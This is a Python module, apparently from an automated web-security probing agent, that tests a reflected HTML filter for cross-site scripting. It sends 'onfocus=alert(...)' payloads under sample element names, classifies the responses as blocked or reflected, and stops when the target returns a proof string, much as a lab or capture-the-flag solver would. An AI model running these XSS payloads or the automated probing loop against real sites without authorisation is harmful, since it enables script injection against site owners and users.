from __future__ import annotations

import html
import json
import re
from typing import TYPE_CHECKING
from urllib.parse import urlsplit

from ravage.deterministic_agents.reflection_value import (
    _reflection_value_targets,
    _selected_reflection_targets,
    _send_target,
    _target_brief,
    _target_contexts,
    _target_replay,
)
from ravage.probe_suite_parts.result import ProbeRunResult
from ravage.web_core.proof_recognizer import recognize_proofs

if TYPE_CHECKING:
    from ravage.agent_core.agent_state import AgentState
    from ravage.web_core.http_probe import ProbeResponse, ProbeSession

PROBE_NAME = "xss_filter_constraint"
PROBE_PURPOSE = (
    "solve a reflected HTML filter with bounded one-dimension element-name "
    "boundary samples and stop on target-returned proof"
)

_DIALOG_CALL_RE = re.compile(
    r"\b(?:alert|confirm|prompt)\s*\(\s*(['\"`])([^\r\n]{1,80}?)\1\s*\)",
    flags=re.IGNORECASE,
)
_BLOCK_MARKERS = (
    "can't use that tag",
    "cannot use that tag",
    "blocked tag",
    "tag is blocked",
    "tag not allowed",
    "tag is not allowed",
    "forbidden tag",
    "disallowed tag",
    "rejected tag",
)
_TAG_BOUNDARY_SAMPLES = tuple(chr(codepoint) for codepoint in range(ord("x"), ord("z") + 1))
_CONTROL_CODEPOINT_LIMIT = 32


def probe_xss_filter_constraint(
    session: ProbeSession,
    state: AgentState,
) -> ProbeRunResult:
    """Try one bounded element-name dimension after a reflected HTML lead."""
    target = _eligible_target(state)
    if target is None:
        return _inactive_result("no exact target-observed reflected request template")
    dialog_value = _visible_dialog_value(state)
    if not dialog_value:
        return _inactive_result("no exact target-visible dialog value")

    requests: list[dict[str, object]] = []
    for element_name in _TAG_BOUNDARY_SAMPLES:
        value = _focus_payload(element_name, dialog_value)
        response = _send_target(session, target, value)
        branch = _response_branch(response, value=value)
        requests.append(
            response.summary(body_chars=640)
            | {
                "probe_kind": "xss_filter_constraint_variant",
                "target": _target_brief(target),
                "dimension": "element_name",
                "element_name": element_name,
                "value": value,
                "response_branch": branch,
            }
        )
        proofs = recognize_proofs(response.body)
        if proofs:
            return ProbeRunResult(
                ok=True,
                probe=PROBE_NAME,
                summary=(
                    "target proof recognized after bounded element-name boundary "
                    f"sampling; requests={len(requests)}"
                ),
                findings=[
                    {
                        "type": "xss_filter_constraint_proof",
                        "input": _target_brief(target),
                        "dimension": "element_name",
                        "element_name": element_name,
                        "value": value,
                        "proofs": proofs,
                        "response": response.summary(body_chars=900),
                        "replay": _target_replay(target, value),
                    }
                ],
                requests=requests,
            )

    return ProbeRunResult(
        ok=False,
        probe=PROBE_NAME,
        summary=(
            "exhausted bounded element-name boundary samples without "
            f"target-returned proof; requests={len(requests)}"
        ),
        requests=requests,
    )


def _eligible_target(state: AgentState) -> dict[str, object] | None:
    targets = _selected_reflection_targets(_reflection_value_targets(state))
    recon_reflection: dict[str, object] | None = None
    for target in targets:
        contexts = _target_contexts(target, state)
        if any(str(context.get("context") or "") == "html_body" for context in contexts):
            return target
        if recon_reflection is None and _is_recon_confirmed_reflection(target, state):
            recon_reflection = target
    return recon_reflection


def _is_recon_confirmed_reflection(
    target: dict[str, object],
    state: AgentState,
) -> bool:
    target_input = str(target.get("input") or "")
    target_endpoint = _endpoint_identity(str(target.get("url") or ""))
    reflections = state.surface.get("reflections")
    if not target_input or target_endpoint is None or not isinstance(reflections, list):
        return False
    for reflection in reflections:
        if not isinstance(reflection, dict):
            continue
        if str(reflection.get("name") or "") != target_input:
            continue
        endpoints = (
            _endpoint_identity(str(reflection.get("page") or "")),
            _endpoint_identity(str(reflection.get("url") or "")),
        )
        if target_endpoint in endpoints:
            return True
    return False


def _endpoint_identity(value: str) -> tuple[str, str, str] | None:
    parsed = urlsplit(value)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        return None
    return (parsed.scheme.lower(), parsed.netloc.lower(), parsed.path or "/")


def _visible_dialog_value(state: AgentState) -> str:
    description = str(state.surface.get("visible_description") or "")
    match = _DIALOG_CALL_RE.search(html.unescape(description))
    if match is None:
        return ""
    value = match.group(2).strip()
    if not value or any(ord(character) < _CONTROL_CODEPOINT_LIMIT for character in value):
        return ""
    return value


def _focus_payload(element_name: str, dialog_value: str) -> str:
    encoded_value = json.dumps(dialog_value, ensure_ascii=True)
    return f"<{element_name} autofocus tabindex=1 onfocus=alert({encoded_value})>"


def _response_branch(response: ProbeResponse, *, value: str) -> str:
    body = html.unescape(response.body).lower()
    if any(marker in body for marker in _BLOCK_MARKERS):
        return "blocked_element_name"
    if value.lower() in body:
        return "reflected_candidate"
    if response.error:
        return "request_error"
    return "changed_response"


def _inactive_result(reason: str) -> ProbeRunResult:
    return ProbeRunResult(
        ok=False,
        probe=PROBE_NAME,
        summary=f"constraint probe inactive: {reason}",
    )


__all__ = ["PROBE_NAME", "PROBE_PURPOSE", "probe_xss_filter_constraint"]
